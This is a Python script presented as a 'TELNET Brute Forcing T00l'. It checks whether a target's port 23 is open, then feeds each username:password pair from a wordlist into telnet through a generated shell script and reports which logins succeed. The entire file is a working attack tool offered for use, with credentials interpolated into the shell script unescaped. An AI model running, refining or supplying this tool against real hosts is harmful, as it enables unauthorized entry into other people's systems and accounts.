#!/usr/bin/python
# -*- coding: utf-8 -*-

try:
  import os
  import socket
  import argparse
  import platform
  if platform.system() != "Linux":
    exit("[!] Your OS Platform may not be Supported by this tool");
  class bcolors:
      HEADER = '\033[95m'
      OKBLUE = '\033[94m'
      OKGREEN = '\033[92m'
      WARNING = '\033[93m'
      FAIL = '\033[91m'
      ENDC = '\033[0m'
      BOLD = '\033[1m'
      UNDERLINE = '\033[4m'
      grey = "\033[100m"
      yel = "\033[93m"
      bakblk='\033[40m'
      bldblk='\033[1;95m'

  print bcolors.BOLD + bcolors.yel + """
         .---.        .-----------
        /     \  __  /    ------
       / /     \(  )/    -----
      //////   ' \/ `   ---
     //// / // :    : ---
    // /   /  /`    '--
   //          //..\\
          ====UU====UU====
              '//||\\`
                ''``"""  + bcolors.ENDC
  print(bcolors.OKBLUE + bcolors.BOLD + "     TELNET Brute Forcing T00l")               
  print("        Coded by " + bcolors.FAIL + "#Php_Err0R"+ bcolors.ENDC + "\n")

  parser = argparse.ArgumentParser(description="An argparse example")
  parser.add_argument('--target', help='Your Target address)')
  parser.add_argument('--file', help='Your Text File')
  args = parser.parse_args()
  target = getattr(args, 'target')
  text_file = getattr(args, 'file')
  options = parser.parse_args()
  if options.target and options.file:
    if(target != "" and text_file != ""):
      try:
        socket.gethostbyaddr(target)
        print(bcolors.BOLD + "[!] Target: " + str(target) + " (" + bcolors.OKGREEN + "Alive" + bcolors.ENDC + ")")

        if(os.path.isfile(text_file)):
          print(bcolors.BOLD + "[!] File: " + str(text_file) + " (" + bcolors.OKGREEN + "Found" + bcolors.ENDC + ")")
          server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          try:
            server.connect((target, 23))  # argument must be a tuple pair of ip address and port
            print(bcolors.BOLD + "[!] TELNET Service Port: " + "23" + " (" + bcolors.OKGREEN + "Open" + bcolors.ENDC + ")")
            server.close()
          except:
            print(bcolors.BOLD + "[!] TELNET Service Port: " + "23" + " (" + bcolors.FAIL + "Closed" + bcolors.ENDC + ")")
            server.close()
            exit()
        else:
            print(bcolors.BOLD + "[!] File: " + str(text_file) + " (" + bcolors.FAIL + "Not Found" + bcolors.ENDC + ")")
            exit()
      except socket.herror:
          print(bcolors.BOLD + "[!] Target: " + str(target) + " (" + bcolors.FAIL + "Down" + bcolors.ENDC + ")")
          exit()
    print(bcolors.BOLD + "\n[+]" + bcolors.OKGREEN + " Brute Forcing attack Session Started \n" + bcolors.ENDC )
    with open(text_file) as f:
      for line in f:
        ###########################
        HOST=target
        HOST1 = '"' + HOST + '"'
        USER= line.split(":")[0]
        USER1 = '"' + USER + '"'
        PASSWD= line.split(":")[1]
        PASSWD1 = '"' + PASSWD + '"'
        CMD1='logout'
        CMD='?'
        ###########################

        bash = ('#!/bin/sh '
           		'\nHOST='+HOST1 + '\n'
           		'USER='+USER1 + '\n'
           		'PASSWD='+PASSWD1 + '\n'
           		'CMD1="logout"'
           		'\nCMD="?"'
           		'\n( echo open "$HOST"'
           		'\nsleep 2'
           		'\n echo "$USER"'
        		  '\nsleep 2'
           		'\necho "$PASSWD"'
        		  '\nsleep 2'
        		  '\necho "$CMD"'
        		  '\nsleep 2' 
        		  '\necho "$CMD1"'
        		  '\nsleep 2'
        		  '\n) | telnet ')
        f = open( 'lib/2.sh', 'w' )
        f.write(bash)
        f.close()
        os.system("bash lib/2.sh > lib/results.txt")
        if 'login failed' in open('lib/results.txt').read():
          print(bcolors.BOLD + "[!] username: " + USER + "\n[!] password: " + PASSWD + "[!] Stauts: " + bcolors.FAIL + "Failed \n" + bcolors.ENDC)
        if 'login failed' not in open('lib/results.txt').read():
          print(bcolors.BOLD + "[!] username: " + USER + "\n[!] password: " + PASSWD + "[!] Stauts: " + bcolors.OKGREEN + "Succeeded \n" + bcolors.ENDC)
  else:
      print(bcolors.BOLD + "[!] an example of usage:-\n./start.py --target 127.0.0.1 --file list.txt" + bcolors.ENDC)
      exit();
except KeyboardInterrupt:
  print("OUT");
  exit();
